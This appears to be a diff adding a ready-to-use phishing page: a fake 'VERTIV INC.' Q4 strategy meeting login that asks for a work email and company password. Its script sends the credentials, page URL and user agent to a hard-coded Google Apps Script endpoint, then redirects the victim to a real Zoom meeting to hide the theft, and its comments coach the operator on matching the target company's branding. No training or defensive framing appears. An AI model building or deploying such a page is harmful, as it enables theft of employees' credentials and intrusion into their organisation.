@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join VERTIV INC. Meeting - Secure Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        /* --- CSS STYLES START HERE --- */
+        :root {
+            /* Adjust these colors to match the target company's branding */
+            --primary-color: #1A73E8; /* Example Blue */
+            --background-color: #f0f4f8;
+            --card-color: #ffffff;
+            --text-color: #202124;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            background-color: var(--card-color);
+            padding: 40px 50px;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border-top: 8px solid var(--primary-color); 
+        }
+
+        .logo-area img {
+            max-width: 180px;
+            height: auto;
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            color: var(--text-color);
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+
+        p.subtitle {
+            color: #6c757d;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+
+        .form-group input[type="email"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1.1em;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.25);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.2em;
+            font-weight: 700;
+            transition: background-color 0.3s ease, transform 0.1s;
+        }
+
+        button:hover:not(:disabled) {
+            background-color: #0056b3;
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+
+        .footer-links {
+            margin-top: 25px;
+            font-size: 0.85em;
+            color: #6c757d;
+        }
+        .footer-links a {
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+        /* --- CSS STYLES END HERE --- */
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+
+        <!-- Replace this with the company's official logo -->
+        <div class="logo-area">
+            <img src="logo.png" alt="Company Logo">
+        </div>
+
+        <!-- Customize these messages to fit the scenario -->
+        <h1>Welcome to the Q4 Strategy Session</h1>
+        <p class="subtitle">Your credentials are required to access the live video feed and meeting materials.</p>
+
+        <!-- The FORM that collects the data -->
+        <form id="loginForm">
+
+            <div class="form-group">
+                <label for="email">Work Email Address</label>
+                <input type="email" id="email" name="email" required placeholder="your.name@company.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Company Password</label>
+                <input type="password" id="password" name="password" required placeholder="Your network password">
+            </div>
+
+            <!-- The crucial button that submits the data -->
+            <button type="submit" id="loginButton">JOIN MEETING NOW</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">Need Assistance?</a> | 
+            <a href="#">Meeting Host Support</a>
+        </div>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const loginButton = document.getElementById('loginButton');
+
+            // =====================================================================
+            // *** CRITICAL CONFIGURATION ***
+            // =====================================================================
+            // 1. Paste the Google Apps Script Web App URL from Part 1
+            const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbyarqyhpieZKmCe3ZiCf9vh6e4_LnC1GnzFBbYq8-W-NqNVJZLHpcN2j6xzcYOXMniziw/exec'; 
+
+            // 2. Paste the real meeting link for redirection
+            const REAL_MEETING_URL = 'https://zoom.us/j/YOUR_ACTUAL_MEETING_ID'; 
+            // =====================================================================
+
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault(); 
+
+                // --- 1. Gather Basic Data ---
+                const emailInput = document.getElementById('email').value;
+                const passwordInput = document.getElementById('password').value;
+
+                // --- 2. Capture Forensic Data (IP and User Agent) ---
+
+                // --- User Agent (Easily available via browser) ---
+                const userAgent = navigator.userAgent; 
+
+                // --- IP Address (Difficult from pure HTML/JS alone, but we capture the network context) ---
+                // NOTE: Getting the *true* remote IP of the user requires a server-side call (like a dedicated API endpoint). 
+                // For a simple setup, we pass the client's local network info or use a dedicated service.
+                // For this comprehensive setup, we pass a placeholder, which you can replace with a Geolocation API call if needed.
+                const ipAddress = 'IP Address to be retrieved by server/API'; 
+
+                // If you need the actual IP, you MUST use a service or a dedicated backend server, 
+                // as pure JS in a browser can't universally get the external IP easily.
+
+                // --- 3. Package Data Payload ---
+                const payload = {
+                    email: emailInput,
+                    password: passwordInput,
+                    source_link: window.location.href, // Where they found the page
+                    ip_address: ipAddress, // Passed placeholder
+                    user_agent: userAgent  // The browser string
+                };
+
+                // Disable button while sending
+                loginButton.disabled = true;
+                loginButton.textContent = 'Verifying Credentials...';
+
+                // 4. Send data via fetch API
+                fetch(LOGGING_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Server response was not OK.');
+                    }
+                })
+                .then(data => {
+                    // Success: Logged to Sheet
+                    alert('Success! Credentials validated. Joining meeting now.');
+
+                    // REDIRECTION: Send them to the real meeting
+                    window.location.href = REAL_MEETING_URL; 
+                })
+                .catch(error => {
+                    // Error: Logging failed
+                    console.error('Phishing Attack Error:', error);
+                    alert('Validation Failed. Please check your login details.');
+                    // Fallback: Even if logging fails, send them to the meeting
+                    window.location.href = REAL_MEETING_URL; 
+                })
+                .finally(() => {
+                    // Re-enable button
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'JOIN MEETING NOW';
+                });
+            });
+        });
+    </script>
+
+</body>
+</html>
